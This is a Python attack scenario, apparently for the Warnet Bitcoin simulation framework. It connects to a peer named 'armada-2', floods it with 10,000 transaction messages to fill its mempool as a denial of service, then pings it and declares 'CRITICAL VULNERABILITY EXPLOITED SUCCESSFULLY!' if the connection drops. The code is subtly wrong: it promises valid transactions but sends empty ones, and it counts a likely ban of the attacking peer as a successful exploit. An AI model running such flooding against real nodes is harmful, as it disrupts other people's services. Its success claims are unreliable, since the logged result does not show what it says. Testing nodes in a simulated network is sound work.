#!/usr/bin/env python3

import socket
import time

from commander import Commander

from test_framework.messages import (
    msg_tx,
    msg_ping,
)
from test_framework.p2p import P2PInterface
from test_framework.wallet_util import bytes_to_wif


class DosFullMempool(Commander):
    def set_test_params(self):
        self.num_nodes = 1

    def add_options(self, parser):
        parser.description = (
            "Demonstrate DoS attack by filling mempool with valid transactions"
        )
        parser.usage = "warnet run v96_dos_full_mempool.py --debug"

    def get_node(self):
        for n in self.nodes:
            try:
                n.getnetworkinfo()
                node = n
                break
            except Exception as e:
                continue

        return node

    # Scenario entrypoint
    def run_test(self):
        node = self.get_node()

        if node is None:
            self.log.error("No working nodes found!")
            return

        victim = "armada-2"  
        dstaddr = socket.gethostbyname(victim)

        attacker = P2PInterface()
        attacker.peer_connect(
            dstaddr=dstaddr, dstport=node.p2pport, net=node.chain, timeout_factor=1
        )()
        attacker.wait_until(lambda: attacker.is_connected, check_connected=False)

        num_transactions = 10000

        self.log.info(f"Sending {num_transactions} transactions to fill mempool...")

        for i in range(num_transactions):
            try:
                tx = msg_tx()
                tx.tx.vin = []  
                tx.tx.vout = []  
                tx.tx.nVersion = 1
                tx.tx.nLockTime = 0

                attacker.send_message(tx)
            except Exception as e:
                continue


        try:
            ping = msg_ping()
            ping_count = 0
            while ping_count < 10:
                if not attacker.is_connected:
                    self.log.info("CRITICAL VULNERABILITY EXPLOITED SUCCESSFULLY!")
                    break
                    
                self.log.info(f"Ping: {ping_count + 1}")
                attacker.send_message(ping)
                ping_count += 1
                time.sleep(1)  
        except:
            self.log.info("CRITICAL VULNERABILITY EXPLOITED SUCCESSFULLY!")


def main():
    DosFullMempool().main()


if __name__ == "__main__":
    main()